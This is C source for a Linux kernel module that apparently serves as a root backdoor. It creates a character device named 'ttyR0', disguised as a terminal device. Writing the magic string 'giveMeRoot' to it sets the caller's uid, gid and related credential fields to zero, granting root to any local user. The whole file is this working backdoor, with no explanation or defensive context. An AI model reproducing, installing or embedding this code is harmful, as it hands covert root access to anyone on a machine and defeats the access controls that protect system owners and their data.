#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

#define DEVICE_NAME "ttyR0"
#define CLASS_NAME "ttyR"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
#define V(x) x.val
#else
#define V(x) x
#endif

//Prototypes

static int	__init root_init(void);
static void	__exit root_exit(void);
static int	root_open(struct inode *inode,struct file *f);
static ssize_t	root_write(struct file* f,const char __user *user_buf,size_t len,loff_t *offset);
static ssize_t	root_read(struct file* f,char *buf,size_t len, loff_t *offset);

MODULE_LICENSE("GPL");

static int		majorNum;
static struct class*	rootcharClass = NULL;
static struct device*	rootcharDevice = NULL;

static struct file_operations fops = {
	
	.owner =THIS_MODULE,
	.open = root_open,
	.write = root_write,
	.read = root_read,
};

static int root_open(struct inode* inode,struct file* f){
	
	return 0;
}


static ssize_t root_read(struct file *f,char *buf,size_t len,loff_t* offset){
	
	return len;
}

static ssize_t root_write(struct file *f,const char __user *user_buf,size_t len,loff_t *offset){

	char	*data;
	char	magic[] = "giveMeRoot";
	struct 	cred* new_cred;

	data = (char *) kmalloc(len+1,GFP_KERNEL);
	
	if(data){
		
		copy_from_user (data,user_buf,len);
		if(memcmp(data,magic,10)==0){
			
			if((new_cred = prepare_creds())==NULL){
				printk("ttyR:Cannot prepare creds.\n");
				return 0;
			}
			printk("ttyR:You got it.\n");
			V(new_cred -> uid) = V(new_cred -> gid) = 0;
			V(new_cred -> euid) = V(new_cred -> egid) = 0;
			V(new_cred -> suid) = V(new_cred -> sgid) = 0;
			V(new_cred -> fsuid) = V(new_cred -> fsgid) = 0;
			commit_creds(new_cred);
		}
		kfree(data);
	}else{
		printk(KERN_ALERT "ttyR:Unable to allocate memeory.\n");
	}
	return len;
}

static int __init root_init(void){
	
	printk("ttyR:LKM installed.");

	if((majorNum = register_chrdev(0,DEVICE_NAME,&fops)) < 0){
		printk(KERN_ALERT "ttyR: Failed to register magic number.\n");
		return majorNum;
	}
	printk(KERN_INFO "ttyR:Major number %d\n",majorNum);

	rootcharClass = class_create(THIS_MODULE,CLASS_NAME);
	if(IS_ERR(rootcharClass)){
		unregister_chrdev(majorNum,DEVICE_NAME);
		printk(KERN_ALERT "ttyR:Failed to register device class.\n");
		return PTR_ERR(rootcharClass);
	}
	printk(KERN_INFO "ttyR:Successfully registered device class.\n");

	rootcharDevice = device_create(rootcharClass,NULL,MKDEV(majorNum,0),NULL,DEVICE_NAME);
	if(IS_ERR(rootcharDevice)){
		class_destroy(rootcharClass);
		unregister_chrdev(majorNum,DEVICE_NAME);
		printk(KERN_ALERT "ttyR:Failed to create the device.\n");
		return PTR_ERR(rootcharDevice);
	}
	return 0;
}

static void __exit root_exit(void){

	device_destroy(rootcharClass,MKDEV(majorNum,0));
	class_unregister(rootcharClass);
	class_destroy(rootcharClass);
	unregister_chrdev(majorNum,DEVICE_NAME);

	printk("ttyR:Bye!");
}



module_init(root_init);
module_exit(root_exit);
